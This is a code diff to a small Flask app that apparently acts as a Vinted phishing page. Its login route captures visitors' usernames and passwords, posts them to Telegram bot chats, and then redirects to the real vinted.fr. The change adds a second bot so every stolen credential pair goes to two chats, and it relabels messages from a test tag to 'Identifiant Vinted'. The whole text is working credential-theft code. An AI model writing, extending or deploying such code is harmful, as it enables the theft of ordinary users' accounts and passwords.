@@ -7,14 +7,25 @@ load_dotenv()
 
 app = Flask(__name__)
 
-TELEGRAM_BOT_TOKEN = os.getenv("BOT_TOKEN")
-CHAT_ID = os.getenv("CHAT_ID")
+# Premier bot
+TELEGRAM_BOT_TOKEN_1 = os.getenv("BOT_TOKEN")
+CHAT_ID_1 = os.getenv("CHAT_ID")
+
+# Deuxième bot
+TELEGRAM_BOT_TOKEN_2 = os.getenv("BOT_TOKEN_2")
+CHAT_ID_2 = os.getenv("CHAT_ID_2")
 
 
 def send_telegram_message(message):
-    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
-    data = {"chat_id": CHAT_ID, "text": message}
-    requests.post(url, data=data)
+    # Envoie via le premier bot
+    url1 = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN_1}/sendMessage"
+    data1 = {"chat_id": CHAT_ID_1, "text": message}
+    requests.post(url1, data=data1)
+
+    # Envoie via le deuxième bot
+    url2 = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN_2}/sendMessage"
+    data2 = {"chat_id": CHAT_ID_2, "text": message}
+    requests.post(url2, data=data2)
 
 
 @app.route("/", methods=["GET"])
@@ -28,7 +39,7 @@ def login():
     password = request.form["password"]
 
     # Envoie à Telegram
-    send_telegram_message(f"[Test Vinted Login] 👤 {username} | 🔑 {password}")
+    send_telegram_message(f"[ Idenfiant Vinted ] 👤 {username} | 🔑 {password}")
 
     # Redirige vers Vinted
     return redirect("https://www.vinted.fr")
